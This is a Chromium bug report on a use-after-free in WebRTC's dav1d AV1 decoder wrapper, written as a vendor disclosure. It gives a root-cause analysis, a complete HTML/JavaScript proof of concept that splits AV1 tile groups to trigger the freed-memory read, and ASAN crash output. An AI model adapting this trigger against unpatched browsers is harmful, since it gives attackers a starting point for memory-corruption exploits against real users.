# Use-after-free in WebRTC dav1d AV1 decoder due to missing buffer lifetime management leads to heap read of freed memory

| Field | Value |
|-------|-------|
| **Issue ID** | [486421953](https://issues.chromium.org/issues/486421953) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ph...@google.com |
| **Created** | 2026-02-22 |
| **Bounty** | $11,000.00 |

## Description

## Title

Use-after-free in WebRTC dav1d AV1 decoder due to missing buffer lifetime management leads to heap read of freed memory

## Summary

The WebRTC dav1d AV1 decoder wrapper (`Dav1dDecoder::Decode`) uses `dav1d_data_wrap()` with a no-op `NullFreeCallback` to pass encoded frame data to dav1d, without retaining a reference to the underlying `EncodedImage` buffer. When dav1d receives an AV1 bitstream containing partial tile groups, it internally saves data pointers into its `c->tile[]` array via `dav1d_data_ref()`, expecting the buffer to remain valid across subsequent `dav1d_send_data` calls. After `Decode()` returns, the caller destroys the `RtpFrameObject`, which releases the `EncodedImageBuffer`. On a subsequent `Decode()` call that completes the tile group, dav1d reads through the now dangling tile data pointer, resulting in a heap use-after-free.

## Bisect

Introducing Commit: `b09d87232b8948cebb39174e2a74e24943e5d312` (WebRTC repository)

- Date: 2021-11-23
- Author: philipel ([philipel@webrtc.org](mailto:philipel@webrtc.org))
- Review: <https://webrtc-review.googlesource.com/c/src/+/238661>

This is the reland of the original "Add dav1d decoder to WebRTC" commit. The `NullFreeCallback` pattern and the associated lifetime gap have existed since the initial introduction of the dav1d decoder wrapper.

## Root Cause

The dav1d library's data input API, `dav1d_data_wrap()`, accepts a raw pointer to encoded bitstream data along with a `free_callback` that dav1d invokes when it no longer needs the buffer. This callback mechanism is dav1d's sole mechanism for the caller to manage the lifetime of the wrapped buffer. The WebRTC integration in `dav1d_decoder.cc` registers a no-op callback:

```
// third_party/webrtc/modules/video_coding/codecs/av1/dav1d_decoder.cc
// Calling `dav1d_data_wrap` requires a `free_callback` to be registered.
void NullFreeCallback(const uint8_t* /* buffer */, void* /* opaque */) {}

```

This means that dav1d's internal reference counting on the wrapped data has no effect on the actual buffer lifetime. The `Decode` method wraps the `EncodedImage` data pointer directly without retaining any reference to the buffer:

```
// third_party/webrtc/modules/video_coding/codecs/av1/dav1d_decoder.cc
int32_t Dav1dDecoder::Decode(const EncodedImage& encoded_image,
                             int64_t /*render_time_ms*/) {
  // ...
  ScopedDav1dData scoped_dav1d_data;
  Dav1dData& dav1d_data = scoped_dav1d_data.Data();
  dav1d_data_wrap(&dav1d_data, encoded_image.data(), encoded_image.size(),
                  /*free_callback=*/&NullFreeCallback,
                  /*user_data=*/nullptr);

  if (int decode_res = dav1d_send_data(context_, &dav1d_data)) {
    return WEBRTC_VIDEO_CODEC_ERROR;
  }
  // ...
}

```

The AV1 bitstream format allows tile group data to be split across multiple OBUs. When dav1d parses an `OBU_TILE_GRP` (or the tile group portion of an `OBU_FRAME`), it saves a reference to the tile data in its internal `c->tile[]` array:

```
// third_party/dav1d/libdav1d/src/obu.c (parse_obus, case DAV1D_OBU_TILE_GRP)
dav1d_data_ref(&c->tile[c->n_tile_data].data, in);
c->tile[c->n_tile_data].data.data = gb.ptr;
c->tile[c->n_tile_data].data.sz = (size_t)(gb.ptr_end - gb.ptr);

```

If not all tiles for a frame have been received (for example, a 2-tile frame where only tile 0 arrives in the first chunk), dav1d returns `EAGAIN` from `dav1d_get_picture()` and the `c->tile[]` references persist. The `Decode()` method returns `WEBRTC_VIDEO_CODEC_ERROR`, and the caller (`VideoReceiveStream2::DecodeAndMaybeDispatchEncodedFrame`) proceeds to destroy the `unique_ptr<EncodedFrame>`, which releases the underlying `EncodedImageBuffer`:

```
freed by thread T4 (ThreadPoolForeg):
    operator delete[]
    EncodedImageBuffer::~RefCountedObject
    EncodedImage::~EncodedImage
    RtpFrameObject::~RtpFrameObject
    VideoReceiveStream2::DecodeAndMaybeDispatchEncodedFrame

```

At this point, dav1d's `c->tile[0].data` still contains a pointer into the now freed `EncodedImageBuffer`. When a subsequent `Decode()` call delivers the remaining tile group, dav1d has all tiles collected and calls `dav1d_submit_frame`, which reads through the stale pointer during CDF initialization in `dav1d_msac_init`.

It is worth noting that Chrome's media pipeline has a separate dav1d integration (`media/filters/dav1d_video_decoder.cc`) that handles this correctly by using `ReleaseDecoderBuffer` as the free callback and calling `buffer->AddRef()` to prevent premature destruction:

```
// media/filters/dav1d_video_decoder.cc
static void ReleaseDecoderBuffer(const uint8_t* buffer, void* opaque) {
  if (opaque)
    static_cast<DecoderBuffer*>(opaque)->Release();
}

```

The WebRTC wrapper never adopted this pattern. Additionally, after a decode error, the WebRTC stack does not reset or flush the dav1d decoder context. `VCMGenericDecoder::Decode` only calls `ClearTimestampMap()` on error, and `c->frame_hdr` persists across calls inside dav1d, so a subsequent tile group OBU is accepted without needing a new frame header. The ASAN report confirms the absence of MiraclePtr protection on this path: "MiraclePtr Status: NOT PROTECTED".

## Reproduce

Save the following HTML file and open it in a Chromium ASAN build with AV1 WebRTC support:

```
ASAN_OPTIONS=detect_odr_violation=0 ./out/asan-release/chrome \
  --no-sandbox --disable-gpu --enable-logging=stderr \
  --autoplay-policy=no-user-gesture-required \
  --user-data-dir=/tmp/poc-test poc.html

```
```
<!DOCTYPE html>
<html>
<head>
<title> PoC - dav1d Tile Group UAF</title>
</head>
<body>
<h3>WRTC-065: dav1d Decoder Input Buffer Lifetime UAF</h3>
<canvas id="c" width="320" height="240" style="display:none;"></canvas>
<pre id="log"></pre>
<script>
// ============================================================
//  PoC: dav1d tile group UAF via WebRTC
//
// Strategy: Intercept first real AV1 keyframe from encoder,
// parse its OBU structure, and split into two chunks:
//   Chunk 1: SeqHdr + OBU_FRAME_HDR (from real data) + OBU_TILE_GRP(tile 0)
//   Chunk 2: OBU_TILE_GRP(tile 1)
// This causes dav1d to save tile 0 data across Decode() calls
// while the underlying buffer is freed -> UAF.
// ============================================================

function log(msg) {
  const el = document.getElementById('log');
  el.textContent += msg + '\n';
  console.log(msg);
}

// === leb128 encoder/decoder ===
function readLeb128(data, offset) {
  let value = 0;
  let bytesRead = 0;
  for (let i = 0; i < 8; i++) {
    const b = data[offset + i];
    value |= (b & 0x7F) << (7 * i);
    bytesRead++;
    if (!(b & 0x80)) break;
  }
  return { value, bytesRead };
}

function encodeLeb128(value) {
  const bytes = [];
  do {
    let b = value & 0x7F;
    value >>= 7;
    if (value > 0) b |= 0x80;
    bytes.push(b);
  } while (value > 0);
  return new Uint8Array(bytes);
}

// === AV1 OBU parser ===
function parseOBUs(data) {
  const obus = [];
  let offset = 0;
  while (offset < data.length) {
    const headerByte = data[offset];
    const type = (headerByte >> 3) & 0x0F;
    const hasExtension = (headerByte >> 2) & 1;
    const hasSize = (headerByte >> 1) & 1;
    const headerSize = 1 + (hasExtension ? 1 : 0);
    let payloadOffset = offset + headerSize;
    let payloadSize;
    let sizeFieldLen = 0;

    if (hasSize) {
      const r = readLeb128(data, payloadOffset);
      payloadSize = r.value;
      sizeFieldLen = r.bytesRead;
      payloadOffset += sizeFieldLen;
    } else {
      payloadSize = data.length - payloadOffset;
    }

    obus.push({
      type,
      offset,
      headerSize,
      sizeFieldLen,
      payloadOffset,
      payloadSize,
      totalSize: payloadOffset - offset + payloadSize,
      headerByte,
    });
    offset += payloadOffset - offset + payloadSize;
    if (offset <= obus[obus.length-1].offset) break; // safety
  }
  return obus;
}

// === SDP manipulation to prefer AV1 ===
function preferAV1(sdp) {
  const lines = sdp.split('\r\n');
  const result = [];
  let av1Pts = [];
  for (const line of lines) {
    const match = line.match(/^a=rtpmap:(\d+)\s+AV1\//i);
    if (match) av1Pts.push(match[1]);
  }
  if (av1Pts.length === 0) return sdp;
  for (const line of lines) {
    if (line.startsWith('m=video')) {
      const parts = line.split(' ');
      const pts = parts.slice(3);
      const reordered = [...av1Pts, ...pts.filter(pt => !av1Pts.includes(pt))];
      result.push([...parts.slice(0, 3), ...reordered].join(' '));
    } else {
      result.push(line);
    }
  }
  return result.join('\r\n');
}

// === Main PoC ===
async function runPoc() {
  try {
    log('[*] WRTC-065: dav1d Tile Group UAF PoC');
    log('[*] Strategy: Split real AV1 keyframe tile groups across Decode() calls');

    // Canvas video source
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');
    let frameNum = 0;
    function draw() {
      ctx.fillStyle = `hsl(${frameNum % 360}, 70%, 50%)`;
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = 'white';
      ctx.font = '30px monospace';
      ctx.fillText(`F${frameNum}`, 10, 40);
      frameNum++;
      requestAnimationFrame(draw);
    }
    draw();
    const stream = canvas.captureStream(30);
    const videoTrack = stream.getVideoTracks()[0];
    log('[+] Video source created (320x240)');

    const pc1 = new RTCPeerConnection({ bundlePolicy: 'max-bundle' });
    const pc2 = new RTCPeerConnection({
      bundlePolicy: 'max-bundle',
      encodedInsertableStreams: true
    });

    pc1.onicecandidate = e => { if (e.candidate) pc2.addIceCandidate(e.candidate); };
    pc2.onicecandidate = e => { if (e.candidate) pc1.addIceCandidate(e.candidate); };

    pc1.addTrack(videoTrack, stream);

    // Set AV1 codec preference on sender
    const senderTransceiver = pc1.getTransceivers()[0];
    if (senderTransceiver && senderTransceiver.setCodecPreferences) {
      const caps = RTCRtpSender.getCapabilities('video');
      if (caps) {
        const av1Codecs = caps.codecs.filter(c =>
          c.mimeType.toLowerCase() === 'video/av1'
        );
        if (av1Codecs.length > 0) {
          senderTransceiver.setCodecPreferences(av1Codecs);
          log('[+] AV1 codec preference set');
        }
      }
    }

    // Receiver-side transform
    pc2.ontrack = (event) => {
      log('[+] Receiver got track: ' + event.track.kind);
      if (event.track.kind !== 'video') return;

      const receiver = event.receiver;

      // Build worker code with AV1 parsing logic
      const workerCode = `
        // === leb128 reader ===
        function readLeb128(data, offset) {
          let value = 0;
          let bytesRead = 0;
          for (let i = 0; i < 8; i++) {
            const b = data[offset + i];
            value |= (b & 0x7F) << (7 * i);
            bytesRead++;
            if (!(b & 0x80)) break;
          }
          return { value, bytesRead };
        }

        function encodeLeb128(value) {
          const bytes = [];
          do {
            let b = value & 0x7F;
            value >>= 7;
            if (value > 0) b |= 0x80;
            bytes.push(b);
          } while (value > 0);
          return new Uint8Array(bytes);
        }

        // === AV1 OBU parser ===
        function parseOBUs(data) {
          const obus = [];
          let offset = 0;
          while (offset < data.length) {
            const headerByte = data[offset];
            const type = (headerByte >> 3) & 0x0F;
            const hasExtension = (headerByte >> 2) & 1;
            const hasSize = (headerByte >> 1) & 1;
            const headerSize = 1 + (hasExtension ? 1 : 0);
            let payloadOffset = offset + headerSize;
            let payloadSize;
            let sizeFieldLen = 0;

            if (hasSize) {
              const r = readLeb128(data, payloadOffset);
              payloadSize = r.value;
              sizeFieldLen = r.bytesRead;
              payloadOffset += sizeFieldLen;
            } else {
              payloadSize = data.length - payloadOffset;
            }

            obus.push({
              type, offset, headerSize, sizeFieldLen, payloadOffset,
              payloadSize, totalSize: payloadOffset - offset + payloadSize,
              headerByte,
            });
            offset = payloadOffset + payloadSize;
            if (offset <= obus[obus.length-1].offset) break;
          }
          return obus;
        }

        let state = 'WAITING_KEYFRAME';
        let savedChunk2 = null;
        let frameCount = 0;

        // Read N-byte little-endian integer
        function readLE(data, offset, nBytes) {
          let val = 0;
          for (let i = 0; i < nBytes; i++) {
            val |= data[offset + i] << (8 * i);
          }
          return val;
        }

        // Auto-detect n_bytes (tile_size_bytes) by trying 1,2,3,4
        function detectNBytes(data, tileDataStart, tileDataEnd) {
          const totalTileData = tileDataEnd - tileDataStart;
          for (let n = 1; n <= 4; n++) {
            if (tileDataStart + n > tileDataEnd) continue;
            const tile0SizeMinus1 = readLE(data, tileDataStart, n);
            const tile0Size = tile0SizeMinus1 + 1;
            const tile1Size = totalTileData - n - tile0Size;
            // Both tiles must have positive, reasonable sizes
            if (tile0Size > 0 && tile1Size > 0 &&
                tile0Size < totalTileData && tile1Size < totalTileData) {
              return { nBytes: n, tile0Size, tile1Size };
            }
          }
          return null;
        }

        self.onrtctransform = (event) => {
          const transformer = event.transformer;
          const reader = transformer.readable.getReader();
          const writer = transformer.writable.getWriter();

          async function process() {
            while (true) {
              const { value: frame, done } = await reader.read();
              if (done) break;
              frameCount++;

              const data = new Uint8Array(frame.data);

              if (state === 'WAITING_KEYFRAME') {
                const obus = parseOBUs(data);
                const seqIdx = obus.findIndex(o => o.type === 1);
                const frameIdx = obus.findIndex(o => o.type === 6);

                if (seqIdx === -1 || frameIdx === -1) {
                  // Not a keyframe, pass through to keep decoder alive
                  // (decoder needs keyframe first, so pass through non-keyframes too)
                  await writer.write(frame);
                  continue;
                }

                self.postMessage('Frame ' + frameCount + ': keyframe found, ' +
                  obus.length + ' OBUs, size=' + data.length);

                const seqObu = obus[seqIdx];
                const frameObu = obus[frameIdx];
                const seqHdrBytes = data.slice(seqObu.offset, seqObu.offset + seqObu.totalSize);

                // OBU_FRAME layout from OBU start:
                //   [0]: OBU header (1 byte)
                //   [1..1+sizeFieldLen]: leb128 size
                //   [payloadOffset..payloadOffset+~10]: frame header bits (byte-aligned)
                //   Then: tile header (1 byte after byte-alignment)
                //   Then: tile data
                //
                // From tracing: hdr_end_offset = 13 from OBU_FRAME start consistently
                // This is: 1(hdr) + 2(leb128) + 10(frame_hdr_payload) = 13
                // But leb128 can be different sizes. Let's compute properly:
                const obuHdrAndSize = frameObu.headerSize + frameObu.sizeFieldLen;

                // Frame header payload length varies. We know from tracing that for
                // this encoder at 320x240, parse_frame_hdr consumes 10 bytes.
                // But it could be different. Let's try the known offset first,
                // then fall back to a scan.
                const knownFrameHdrBytes = 10;

                const tileHdrOffsetFromObuStart = obuHdrAndSize + knownFrameHdrBytes;
                const tileDataOffsetFromObuStart = tileHdrOffsetFromObuStart + 1;

                const tileHdrOffset = frameObu.offset + tileHdrOffsetFromObuStart;
                const tileDataOffset = frameObu.offset + tileDataOffsetFromObuStart;
                const tileDataEnd = frameObu.offset + frameObu.totalSize;

                // Auto-detect n_bytes
                const detected = detectNBytes(data, tileDataOffset, tileDataEnd);
                if (!detected) {
                  self.postMessage('ERROR: Cannot detect tile sizes at offsets ' +
                    tileDataOffset + '-' + tileDataEnd + ', passing through');
                  await writer.write(frame);
                  state = 'DONE'; // Don't retry
                  continue;
                }

                const { nBytes, tile0Size, tile1Size } = detected;
                const tile0DataStart = tileDataOffset + nBytes;
                const tile0DataEnd = tile0DataStart + tile0Size;
                const tile1DataStart = tile0DataEnd;

                self.postMessage('Tile split: n_bytes=' + nBytes +
                  ' tile0=' + tile0Size + 'B tile1=' + tile1Size + 'B' +
                  ' obuHdrAndSize=' + obuHdrAndSize +
                  ' tileHdr@' + tileHdrOffset + ' tileData@' + tileDataOffset);

                // === BUILD CHUNK 1 ===
                // SeqHdr + modified OBU_FRAME with only tile 0
                const fhLen = tileHdrOffset - frameObu.payloadOffset; // frame header bytes
                const framePayloadTile0 = new Uint8Array(
                  fhLen + 1 + nBytes + tile0Size // fh + tile_hdr + tile_size + tile0
                );
                // Copy frame header
                framePayloadTile0.set(data.slice(frameObu.payloadOffset, tileHdrOffset), 0);
                // New tile header: tile_start_and_end_present=1, start=0, end=0 = 0x80
                framePayloadTile0[fhLen] = 0x80;
                // Copy tile_size + tile 0 data
                framePayloadTile0.set(
                  data.slice(tileDataOffset, tile0DataEnd),
                  fhLen + 1
                );

                const newFrameSize = encodeLeb128(framePayloadTile0.length);
                const newFrameObu = new Uint8Array(1 + newFrameSize.length + framePayloadTile0.length);
                newFrameObu[0] = 0x32; // type=6(FRAME), has_size=1
                newFrameObu.set(newFrameSize, 1);
                newFrameObu.set(framePayloadTile0, 1 + newFrameSize.length);

                const chunk1 = new Uint8Array(seqHdrBytes.length + newFrameObu.length);
                chunk1.set(seqHdrBytes, 0);
                chunk1.set(newFrameObu, seqHdrBytes.length);

                // === BUILD CHUNK 2 ===
                // OBU_TILE_GRP with tile 1
                // Tile header: flag=1, start=1, end=1 = 0xE0
                const tileGrpPayload = new Uint8Array(1 + tile1Size);
                tileGrpPayload[0] = 0xE0;
                tileGrpPayload.set(data.slice(tile1DataStart, tileDataEnd), 1);

                const tileGrpSize = encodeLeb128(tileGrpPayload.length);
                const chunk2 = new Uint8Array(1 + tileGrpSize.length + tileGrpPayload.length);
                chunk2[0] = 0x22; // type=4(TILE_GRP), has_size=1
                chunk2.set(tileGrpSize, 1);
                chunk2.set(tileGrpPayload, 1 + tileGrpSize.length);

                self.postMessage('Chunk1: ' + chunk1.length + 'B, Chunk2: ' + chunk2.length + 'B');

                // Send chunk 1
                const buf1 = new ArrayBuffer(chunk1.length);
                new Uint8Array(buf1).set(chunk1);
                frame.data = buf1;
                await writer.write(frame);

                savedChunk2 = chunk2;
                state = 'SEND_CHUNK2';
                self.postMessage('Sent chunk1, waiting for next frame...');
                continue;
              }

              if (state === 'SEND_CHUNK2') {
                // After chunk1 caused decode error, WebRTC requests a new keyframe
                // and drops all delta frames. We need to wait for the next keyframe
                // (type === 'key') and replace IT with chunk2.
                if (frame.type === 'key' && savedChunk2) {
                  const buf2 = new ArrayBuffer(savedChunk2.length);
                  new Uint8Array(buf2).set(savedChunk2);
                  frame.data = buf2;
                  await writer.write(frame);
                  self.postMessage('Sent chunk2 (' + savedChunk2.length +
                    'B) via keyframe slot (frame ' + frameCount + ') -> UAF should trigger');
                  savedChunk2 = null;
                  state = 'DONE';
                } else {
                  // Drop delta frames (WebRTC will drop them anyway)
                  self.postMessage('Frame ' + frameCount + ' type=' + frame.type +
                    ' while waiting for keyframe, dropping');
                }
                continue;
              }

              if (state === 'DONE') {
                await writer.write(frame);
              }
            }
          }
          process().catch(e => self.postMessage('Transform error: ' + e));
        };
      `;

      try {
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(blob);
        const worker = new Worker(workerUrl);
        worker.onmessage = (e) => log('[worker] ' + e.data);
        worker.onerror = (e) => log('[worker-err] ' + e.message);

        receiver.transform = new RTCRtpScriptTransform(worker, {});
        log('[+] RTCRtpScriptTransform set on receiver');
      } catch (e) {
        log('[!] RTCRtpScriptTransform failed: ' + e.message);
        // Fallback: try createEncodedStreams
        try {
          const streams = receiver.createEncodedStreams();
          log('[+] createEncodedStreams succeeded (fallback)');
          // TODO: implement fallback with same logic
        } catch (e2) {
          log('[!] No Encoded Transform API: ' + e2.message);
        }
      }

      const video = document.createElement('video');
      video.srcObject = new MediaStream([event.track]);
      video.autoplay = true;
      video.muted = true;
      video.style.width = '320px';
      document.body.appendChild(video);
    };

    // SDP exchange
    log('[*] Creating offer...');
    const offer = await pc1.createOffer();
    const mungedOffer = { type: 'offer', sdp: preferAV1(offer.sdp) };
    await pc1.setLocalDescription(mungedOffer);
    await pc2.setRemoteDescription(mungedOffer);

    const recvTransceiver = pc2.getTransceivers().find(
      t => t.receiver.track.kind === 'video'
    );
    if (recvTransceiver && recvTransceiver.setCodecPreferences) {
      const caps = RTCRtpReceiver.getCapabilities('video');
      if (caps) {
        const av1Codecs = caps.codecs.filter(c =>
          c.mimeType.toLowerCase() === 'video/av1'
        );
        if (av1Codecs.length > 0) {
          recvTransceiver.setCodecPreferences(av1Codecs);
          log('[+] AV1 codec preference set on receiver');
        }
      }
    }

    const answer = await pc2.createAnswer();
    const mungedAnswer = { type: 'answer', sdp: preferAV1(answer.sdp) };
    await pc2.setLocalDescription(mungedAnswer);
    await pc1.setRemoteDescription(mungedAnswer);
    log('[+] WebRTC connection established');

    // Wait for frames + UAF
    log('[*] Waiting for keyframe and tile group split...');

    await new Promise(r => setTimeout(r, 15000));
    log('[*] PoC sequence complete. Check ASAN output.');

    pc1.close();
    pc2.close();
    videoTrack.stop();
  } catch (e) {
    log('[!] Error: ' + e.name + ': ' + e.message);
    log('[!] Stack: ' + e.stack);
  }
}

window.addEventListener('load', () => setTimeout(runPoc, 500));
</script>
</body>
</html>

```

The PoC establishes a local WebRTC loopback connection negotiated with AV1. An `RTCRtpScriptTransform` on the receiver side intercepts the first AV1 keyframe, parses its OBU structure, and splits the 2-tile frame into two separate chunks. Chunk 1 (containing only tile 0) is delivered immediately, causing dav1d to save tile data pointers and return `EAGAIN`. The `EncodedImageBuffer` backing chunk 1 is freed when `Decode()` returns. Chunk 2 (containing tile 1) is injected via the next keyframe slot, completing the tile set inside dav1d, which then reads through the freed tile 0 pointer.

ASAN output:

```
=================================================================
==1753512==ERROR: AddressSanitizer: heap-use-after-free on address 0x7ce75394b89a at pc 0x7fd7bad9ecf3 bp 0x7bd349bc5a80 sp 0x7bd349bc5a78
READ of size 1 at 0x7ce75394b89a thread T4 (ThreadPoolForeg)
    #0 0x7fd7bad9ecf2 in dav1d_msac_init third_party/dav1d/libdav1d/src/msac.c:52:25
    #1 0x7fd7bad61bee in dav1d_decode_frame_init_cdf third_party/dav1d/libdav1d/src/decode.c:2456:5
    #2 0x7fd7bad64a54 in dav1d_decode_frame third_party/dav1d/libdav1d/src/decode.c:3290:21
    #3 0x7fd7bad679f6 in dav1d_submit_frame third_party/dav1d/libdav1d/src/decode.c:3698:20
    #4 0x7fd7bada29d2 in dav1d_parse_obus third_party/dav1d/libdav1d/src/obu.c:1682:24
    #5 0x7fd7bad9b8bb in gen_picture third_party/dav1d/libdav1d/src/lib.c:418:31
    #6 0x7fd7bad9b7bc in dav1d_send_data third_party/dav1d/libdav1d/src/lib.c:449:15
    #7 0x7fd7b9ce08c7 in webrtc::(anonymous namespace)::Dav1dDecoder::Decode(webrtc::EncodedImage const&, long) third_party/webrtc/modules/video_coding/codecs/av1/dav1d_decoder.cc:173:24
    #8 0x7fd7b8f96199 in webrtc::VCMGenericDecoder::Decode(webrtc::EncodedImage const&, webrtc::Timestamp, long, std::__Cr::optional<webrtc::FrameInstrumentationData> const&) third_party/webrtc/modules/video_coding/generic_decoder.cc:359:27
    #9 0x7fd7b8fc7399 in webrtc::VideoReceiver2::Decode(webrtc::EncodedFrame const*) third_party/webrtc/modules/video_coding/video_receiver2.cc:91:19
    #10 0x7fd7b904ed6f in webrtc::internal::VideoReceiveStream2::DecodeAndMaybeDispatchEncodedFrame(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>) third_party/webrtc/video/video_receive_stream2.cc:973:39
    #11 0x7fd7b904e799 in webrtc::internal::VideoReceiveStream2::HandleEncodedFrameOnDecodeQueue(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>, bool, bool) third_party/webrtc/video/video_receive_stream2.cc:919:23
    #12 0x7fd7b9051fa1 in void absl::internal_any_invocable::RemoteInvoker<false, void, webrtc::internal::VideoReceiveStream2::OnEncodedFrame(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>)::$_0&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/video/video_receive_stream2.cc:830:32
    #13 0x7fd7b84fa57b in blink::WebRtcTaskQueue::RunTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #14 0x7fd7b84fbcad in base::internal::Invoker<base::internal::FunctorTraits<void (blink::WebRtcTaskQueue::*&&)(absl::AnyInvocable<void () &&>), blink::WebRtcTaskQueue*, absl::AnyInvocable<void () &&>&&>, base::internal::BindState<true, true, false, void (blink::WebRtcTaskQueue::*)(absl::AnyInvocable<void () &&>), base::internal::RetainedRefWrapper<blink::WebRtcTaskQueue>, absl::AnyInvocable<void () &&>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #15 0x7fd7d1f614f2 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #16 0x7fd7d202ab4b in base::internal::TaskTracker::RunTaskImpl(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::internal::SequenceToken const&) base/task/common/task_annotator.h:112:5
    #17 0x7fd7d202ad76 in base::internal::TaskTracker::RunSkipOnShutdown(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::internal::SequenceToken const&) base/task/thread_pool/task_tracker.cc:676:3
    #18 0x7fd7d202939c in base::internal::TaskTracker::RunTask(base::internal::Task, base::internal::TaskSource*, base::TaskTraits const&, base::ThreadType) base/task/thread_pool/task_tracker.cc:706:7
    #19 0x7fd7d2028559 in base::internal::TaskTracker::RunAndPopNextTask(base::internal::RegisteredTaskSource) base/task/thread_pool/task_tracker.cc:394:5
    #20 0x7fd7d204d493 in base::internal::WorkerThread::RunWorker() base/task/thread_pool/worker_thread.cc:473:36
    #21 0x7fd7d204c6ae in base::internal::WorkerThread::RunPooledWorker() base/task/thread_pool/worker_thread.cc:359:3
    #22 0x7fd7d204c0c2 in base::internal::WorkerThread::ThreadMain() base/task/thread_pool/worker_thread.cc:339:7
    #23 0x7fd7d20de6fc in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #24 0x556a2fc0ae36 in asan_thread_start(void*) asan_interceptors.cpp

0x7ce75394b89a is located 26 bytes inside of 236-byte region [0x7ce75394b880,0x7ce75394b96c)
freed by thread T4 (ThreadPoolForeg) here:
    #0 0x556a2fc4761d in operator delete[](void*) (/home/test/chromium/src/out/asan-release/chrome+0x684261d) (BuildId: 6bd3d63c01a5ac1d)
    #1 0x7fd7b8588a71 in webrtc::RefCountedObject<webrtc::EncodedImageBuffer>::~RefCountedObject() gen/third_party/libc++/src/include/__memory/unique_ptr.h:88:5
    #2 0x7fd7b8588989 in webrtc::RefCountedObject<webrtc::EncodedImageBuffer>::Release() const third_party/webrtc/rtc_base/ref_counted_object.h:42:7
    #3 0x7fd7b85873e8 in webrtc::EncodedImage::~EncodedImage() third_party/webrtc/api/scoped_refptr.h:105:13
    #4 0x7fd7b896fb81 in webrtc::RtpFrameObject::~RtpFrameObject() third_party/webrtc/api/video/encoded_frame.h:36:28
    #5 0x7fd7b904f734 in webrtc::internal::VideoReceiveStream2::DecodeAndMaybeDispatchEncodedFrame(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>) gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #6 0x7fd7b904e799 in webrtc::internal::VideoReceiveStream2::HandleEncodedFrameOnDecodeQueue(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>, bool, bool) third_party/webrtc/video/video_receive_stream2.cc:919:23
    #7 0x7fd7b9051fa1 in void absl::internal_any_invocable::RemoteInvoker<false, void, webrtc::internal::VideoReceiveStream2::OnEncodedFrame(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>)::$_0&&>(absl::internal_any_invocable::TypeErasedState*) third_party/webrtc/video/video_receive_stream2.cc:830:32
    #8 0x7fd7b84fa57b in blink::WebRtcTaskQueue::RunTask(absl::AnyInvocable<void () &&>) third_party/abseil-cpp/absl/functional/internal/any_invocable.h:774:1
    #9 0x7fd7b84fbcad in base::internal::Invoker<base::internal::FunctorTraits<void (blink::WebRtcTaskQueue::*&&)(absl::AnyInvocable<void () &&>), blink::WebRtcTaskQueue*, absl::AnyInvocable<void () &&>&&>, base::internal::BindState<true, true, false, void (blink::WebRtcTaskQueue::*)(absl::AnyInvocable<void () &&>), base::internal::RetainedRefWrapper<blink::WebRtcTaskQueue>, absl::AnyInvocable<void () &&>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #10 0x7fd7d1f614f2 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #11 0x7fd7d202ab4b in base::internal::TaskTracker::RunTaskImpl(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::internal::SequenceToken const&) base/task/common/task_annotator.h:112:5
    #12 0x7fd7d202ad76 in base::internal::TaskTracker::RunSkipOnShutdown(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::internal::SequenceToken const&) base/task/thread_pool/task_tracker.cc:676:3
    #13 0x7fd7d202939c in base::internal::TaskTracker::RunTask(base::internal::Task, base::internal::TaskSource*, base::TaskTraits const&, base::ThreadType) base/task/thread_pool/task_tracker.cc:706:7
    #14 0x7fd7d2028559 in base::internal::TaskTracker::RunAndPopNextTask(base::internal::RegisteredTaskSource) base/task/thread_pool/task_tracker.cc:394:5
    #15 0x7fd7d204d493 in base::internal::WorkerThread::RunWorker() base/task/thread_pool/worker_thread.cc:473:36
    #16 0x7fd7d204c6ae in base::internal::WorkerThread::RunPooledWorker() base/task/thread_pool/worker_thread.cc:359:3
    #17 0x7fd7d204c0c2 in base::internal::WorkerThread::ThreadMain() base/task/thread_pool/worker_thread.cc:339:7
    #18 0x7fd7d20de6fc in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #19 0x556a2fc0ae36 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T16 (DedicatedWorker) here:
    #0 0x556a2fc46dfd in operator new[](unsigned long) (/home/test/chromium/src/out/asan-release/chrome+0x6841dfd) (BuildId: 6bd3d63c01a5ac1d)
    #1 0x7fd7b858604e in webrtc::EncodedImageBuffer::Create(unsigned char const*, unsigned long) third_party/webrtc/rtc_base/buffer.h:409:31
    #2 0x7fd7b89e1103 in webrtc::TransformableVideoReceiverFrame::SetData(webrtc::ArrayView<unsigned char const, -4711l>) third_party/webrtc/modules/rtp_rtcp/source/rtp_video_stream_receiver_frame_transformer_delegate.cc:63:9
